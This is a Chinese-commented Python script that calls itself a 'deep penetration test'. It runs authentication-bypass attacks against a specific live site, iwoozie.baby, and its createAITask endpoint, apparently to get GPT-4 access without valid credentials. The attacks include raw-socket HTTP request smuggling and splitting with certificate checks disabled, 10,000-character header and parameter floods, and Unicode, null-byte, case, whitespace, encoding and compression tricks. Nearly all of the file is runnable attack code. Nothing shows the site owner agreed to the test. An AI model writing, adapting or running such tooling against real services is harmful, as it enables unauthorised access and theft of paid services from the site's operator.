#!/usr/bin/env python3
"""
深度渗透测试系统
===============
继续深入渗透测试，探索更多攻击向量
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
import uuid
import re
from datetime import datetime, timedelta
import socket
import ssl

class DeepPenetrationTest:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.results = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'failed_attempts': 0,
            'bypassed_methods': [],
            'failed_methods': []
        }
    
    def print_header(self):
        print("=" * 80)
        print("🔓 深度渗透测试系统")
        print("=" * 80)
        print("🎯 目标: 继续深入渗透测试")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def test_advanced_bypass_techniques(self):
        """测试高级绕过技术"""
        print("🔍 测试高级绕过技术...")
        
        # 测试各种高级绕过技术
        bypass_techniques = [
            self.test_http_smuggling,
            self.test_request_splitting,
            self.test_header_overflow,
            self.test_parameter_overflow,
            self.test_unicode_bypass,
            self.test_case_insensitive_bypass,
            self.test_whitespace_bypass,
            self.test_null_byte_bypass,
            self.test_encoding_bypass,
            self.test_compression_bypass
        ]
        
        for technique in bypass_techniques:
            try:
                if technique():
                    return True
            except Exception as e:
                print(f"  💥 技术测试异常: {str(e)}")
        
        return False
    
    def test_http_smuggling(self):
        """测试 HTTP 请求走私"""
        print("  🔍 测试 HTTP 请求走私...")
        
        # HTTP 请求走私攻击
        smuggling_payloads = [
            "POST /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Length: 0\r\n\r\n",
            "GET /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Length: 0\r\n\r\n",
            "PUT /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Length: 0\r\n\r\n",
            "DELETE /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Length: 0\r\n\r\n"
        ]
        
        for payload in smuggling_payloads:
            try:
                # 发送原始 HTTP 请求
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # 连接到服务器
                sock.connect(('iwoozie.baby', 443))
                
                # 创建 SSL 连接
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with context.wrap_socket(sock, server_hostname='iwoozie.baby') as ssock:
                    ssock.send(payload.encode())
                    response = ssock.recv(4096).decode()
                    
                    self.results['total_attempts'] += 1
                    
                    if '200 OK' in response:
                        print("    ✅ HTTP 请求走私成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("http_smuggling")
                        return True
                    
                    print("    ❌ HTTP 请求走私失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("http_smuggling")
                
            except Exception as e:
                print(f"    💥 HTTP 请求走私异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"http_smuggling - {str(e)}")
        
        return False
    
    def test_request_splitting(self):
        """测试请求分割"""
        print("  🔍 测试请求分割...")
        
        # 请求分割攻击
        splitting_payloads = [
            "GET /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\n\r\n",
            "POST /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Type: application/json\r\n\r\n{\"Content\":[{\"role\":\"user\",\"content\":\"Hello\"}]}",
            "PUT /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\nContent-Type: application/json\r\n\r\n{\"Content\":[{\"role\":\"user\",\"content\":\"Hello\"}]}",
            "DELETE /api/quick/createAITask?model=GPT-4 HTTP/1.1\r\nHost: iwoozie.baby\r\n\r\n"
        ]
        
        for payload in splitting_payloads:
            try:
                # 发送原始 HTTP 请求
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # 连接到服务器
                sock.connect(('iwoozie.baby', 443))
                
                # 创建 SSL 连接
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with context.wrap_socket(sock, server_hostname='iwoozie.baby') as ssock:
                    ssock.send(payload.encode())
                    response = ssock.recv(4096).decode()
                    
                    self.results['total_attempts'] += 1
                    
                    if '200 OK' in response:
                        print("    ✅ 请求分割成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("request_splitting")
                        return True
                    
                    print("    ❌ 请求分割失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("request_splitting")
                
            except Exception as e:
                print(f"    💥 请求分割异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"request_splitting - {str(e)}")
        
        return False
    
    def test_header_overflow(self):
        """测试请求头溢出"""
        print("  🔍 测试请求头溢出...")
        
        # 生成超长请求头
        long_header = 'x-api-key: ' + 'A' * 10000
        long_header2 = 'x-auth-token: ' + 'B' * 10000
        long_header3 = 'x-verification: ' + 'C' * 10000
        
        overflow_headers = [
            long_header,
            long_header2,
            long_header3,
            f"{long_header}\r\n{long_header2}\r\n{long_header3}"
        ]
        
        for header in overflow_headers:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": "Hello"}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('x-api-key', 'test_token')
                
                # 添加溢出请求头
                for line in header.split('\r\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        req.add_header(key.strip(), value.strip())
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 请求头溢出成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("header_overflow")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 请求头溢出失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("header_overflow")
                
            except Exception as e:
                print(f"    💥 请求头溢出异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"header_overflow - {str(e)}")
        
        return False
    
    def test_parameter_overflow(self):
        """测试参数溢出"""
        print("  🔍 测试参数溢出...")
        
        # 生成超长参数
        long_param = 'A' * 10000
        long_param2 = 'B' * 10000
        long_param3 = 'C' * 10000
        
        overflow_params = [
            {'model': 'GPT-4', 'token': long_param},
            {'model': 'GPT-4', 'api_key': long_param2},
            {'model': 'GPT-4', 'auth_token': long_param3},
            {'model': 'GPT-4', 'token': long_param, 'api_key': long_param2, 'auth_token': long_param3}
        ]
        
        for params in overflow_params:
            try:
                param_string = urllib.parse.urlencode(params)
                url = f"{self.base_url}/api/quick/createAITask?{param_string}"
                data = json.dumps({
                    "Content": [{"role": "user", "content": "Hello"}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 参数溢出成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("parameter_overflow")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 参数溢出失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("parameter_overflow")
                
            except Exception as e:
                print(f"    💥 参数溢出异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_overflow - {str(e)}")
        
        return False
    
    def test_unicode_bypass(self):
        """测试 Unicode 绕过"""
        print("  🔍 测试 Unicode 绕过...")
        
        # Unicode 绕过攻击
        unicode_payloads = [
            "Hello\u0000World",
            "Hello\u200BWorld",
            "Hello\u200CWorld",
            "Hello\u200DWorld",
            "Hello\uFEFFWorld",
            "Hello\u00A0World",
            "Hello\u1680World",
            "Hello\u2000World",
            "Hello\u2001World",
            "Hello\u2002World"
        ]
        
        for payload in unicode_payloads:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": payload}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('x-api-key', 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ Unicode 绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("unicode_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ Unicode 绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("unicode_bypass")
                
            except Exception as e:
                print(f"    💥 Unicode 绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"unicode_bypass - {str(e)}")
        
        return False
    
    def test_case_insensitive_bypass(self):
        """测试大小写不敏感绕过"""
        print("  🔍 测试大小写不敏感绕过...")
        
        # 大小写不敏感绕过
        case_variations = [
            'X-API-KEY',
            'x-api-key',
            'X-Api-Key',
            'x-Api-Key',
            'X-API-KEY',
            'x-API-KEY',
            'X-api-key',
            'x-API-key'
        ]
        
        for case_var in case_variations:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": "Hello"}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header(case_var, 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 大小写不敏感绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("case_insensitive_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 大小写不敏感绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("case_insensitive_bypass")
                
            except Exception as e:
                print(f"    💥 大小写不敏感绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"case_insensitive_bypass - {str(e)}")
        
        return False
    
    def test_whitespace_bypass(self):
        """测试空白字符绕过"""
        print("  🔍 测试空白字符绕过...")
        
        # 空白字符绕过
        whitespace_variations = [
            ' x-api-key ',
            '\tx-api-key\t',
            '\nx-api-key\n',
            '\rx-api-key\r',
            ' x-api-key\t',
            '\nx-api-key ',
            '\rx-api-key\n',
            ' x-api-key\r'
        ]
        
        for whitespace_var in whitespace_variations:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": "Hello"}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header(whitespace_var.strip(), 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 空白字符绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("whitespace_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 空白字符绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("whitespace_bypass")
                
            except Exception as e:
                print(f"    💥 空白字符绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"whitespace_bypass - {str(e)}")
        
        return False
    
    def test_null_byte_bypass(self):
        """测试空字节绕过"""
        print("  🔍 测试空字节绕过...")
        
        # 空字节绕过
        null_byte_payloads = [
            "Hello\x00World",
            "Hello\x00\x00World",
            "Hello\x00\x00\x00World",
            "Hello\x00\x00\x00\x00World"
        ]
        
        for payload in null_byte_payloads:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": payload}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('x-api-key', 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 空字节绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("null_byte_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 空字节绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("null_byte_bypass")
                
            except Exception as e:
                print(f"    💥 空字节绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"null_byte_bypass - {str(e)}")
        
        return False
    
    def test_encoding_bypass(self):
        """测试编码绕过"""
        print("  🔍 测试编码绕过...")
        
        # 编码绕过
        encoding_variations = [
            'utf-8',
            'utf-16',
            'utf-32',
            'latin-1',
            'ascii',
            'base64',
            'url',
            'hex'
        ]
        
        for encoding in encoding_variations:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                
                if encoding == 'base64':
                    data = base64.b64encode(json.dumps({
                        "Content": [{"role": "user", "content": "Hello"}]
                    }).encode('utf-8'))
                elif encoding == 'url':
                    data = urllib.parse.urlencode({
                        "Content": json.dumps([{"role": "user", "content": "Hello"}])
                    }).encode('utf-8')
                elif encoding == 'hex':
                    data = json.dumps({
                        "Content": [{"role": "user", "content": "Hello"}]
                    }).encode('utf-8').hex().encode('utf-8')
                else:
                    data = json.dumps({
                        "Content": [{"role": "user", "content": "Hello"}]
                    }).encode(encoding)
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', f'application/json; charset={encoding}')
                req.add_header('x-api-key', 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 编码绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("encoding_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 编码绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("encoding_bypass")
                
            except Exception as e:
                print(f"    💥 编码绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"encoding_bypass - {str(e)}")
        
        return False
    
    def test_compression_bypass(self):
        """测试压缩绕过"""
        print("  🔍 测试压缩绕过...")
        
        # 压缩绕过
        compression_variations = [
            'gzip',
            'deflate',
            'br',
            'compress',
            'identity'
        ]
        
        for compression in compression_variations:
            try:
                url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
                data = json.dumps({
                    "Content": [{"role": "user", "content": "Hello"}]
                }).encode('utf-8')
                
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', 'application/json')
                req.add_header('Accept-Encoding', compression)
                req.add_header('Content-Encoding', compression)
                req.add_header('x-api-key', 'test_token')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    self.results['total_attempts'] += 1
                    
                    if response.getcode() == 200 and 'code' in response_data:
                        try:
                            response_json = json.loads(response_data)
                            if response_json.get('code') == 200:
                                print("    ✅ 压缩绕过成功")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append("compression_bypass")
                                return True
                        except:
                            pass
                    
                    print("    ❌ 压缩绕过失败")
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append("compression_bypass")
                
            except Exception as e:
                print(f"    💥 压缩绕过异常: {str(e)}")
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"compression_bypass - {str(e)}")
        
        return False
    
    def run_comprehensive_test(self):
        """运行综合测试"""
        self.print_header()
        
        print("🚀 开始深度渗透测试...")
        print()
        
        # 测试高级绕过技术
        success = self.test_advanced_bypass_techniques()
        
        print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 深度渗透测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attempts']
        success = self.results['successful_bypasses']
        failed = self.results['failed_attempts']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总尝试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败尝试: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
        else:
            print("  ✅ 系统安全状况良好")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    test = DeepPenetrationTest()
    test.run_comprehensive_test()

if __name__ == "__main__":
    main()
